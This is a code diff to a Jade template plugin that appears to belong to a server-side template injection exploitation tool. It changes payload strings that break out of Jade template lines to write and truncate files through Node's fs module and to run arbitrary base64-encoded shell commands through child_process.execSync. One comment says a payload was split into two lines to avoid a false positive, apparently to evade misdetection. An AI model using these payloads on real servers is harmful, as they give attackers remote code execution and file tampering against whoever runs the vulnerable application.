@@ -19,7 +19,7 @@ class Jade(Plugin):
         # No evaluate_blind here, since we've no sleep, we'll use inject
         'write' : {
             'call' : 'inject',
-            # All the payloads with inject should have a starting \n to escape already started Jade lines
+            # Payloads calling inject must start with \n to break out already started lines
             'write' : """\n- global.process.mainModule.require('fs').appendFileSync('%(path)s', Buffer('%(chunk_b64)s', 'base64'), 'binary')""",
             'truncate' : """\n- global.process.mainModule.require('fs').writeFileSync('%(path)s', '')"""
         },
@@ -47,7 +47,13 @@ class Jade(Plugin):
             'call': 'inject',
             # execSync() has been introduced in node 0.11, so this will not work with old node versions.
             # TODO: use another function.
-            'execute_blind': """\n- global.process.mainModule.require('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString() + ' && sleep %(delay)i')//"""
+            
+            # Payloads calling inject must start with \n to break out already started lines
+            
+            # It's two lines command to avoid false positive with Javascript module
+            'execute_blind': """
+- x = global.process.mainModule.require
+- x('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString() + ' && sleep %(delay)i')//"""
         },
         'execute' : {
             'call': 'render',
